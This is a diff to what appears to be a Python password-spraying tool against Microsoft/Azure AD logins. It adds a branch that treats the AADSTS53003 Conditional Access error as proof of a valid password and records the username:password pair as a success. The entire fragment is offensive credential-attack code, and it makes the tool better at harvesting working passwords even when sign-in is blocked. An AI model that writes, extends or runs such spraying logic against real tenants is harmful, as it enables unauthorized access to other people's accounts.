@@ -346,7 +346,7 @@ for pindex, password in enumerate(passwords):
             with open(start_time + "_untested.txt", "a") as untested_file:
                 untested_file.write(f"{username}:{password}\n")
             continue
-        
+
 
         if r.status_code == 200:
             print(
@@ -437,6 +437,15 @@ for pindex, password in enumerate(passwords):
                     f"{text_colors.yellow}WARNING! It looks like tenant is using external authentication method (e.g. Okta).{text_colors.reset}"
                 )
                 continue
+            elif "AADSTS53003" in error:
+                #Access has been blocked by Conditional Access policies. The
+                #access policy does not allow token issuance.
+                print(
+                    f"{text_colors.green}SUCCESS! {username} : {password} - NOTE: Access blocked by Conditional Access policies.{text_colors.reset}"
+                )
+                results += f"{username} : {password}\n"
+                results_list.append(f"{username}:{password}")
+                usernames.remove(username)
             else:
                 # Unknown errors
                 print(f"Got an error we haven't seen yet for user {username}")
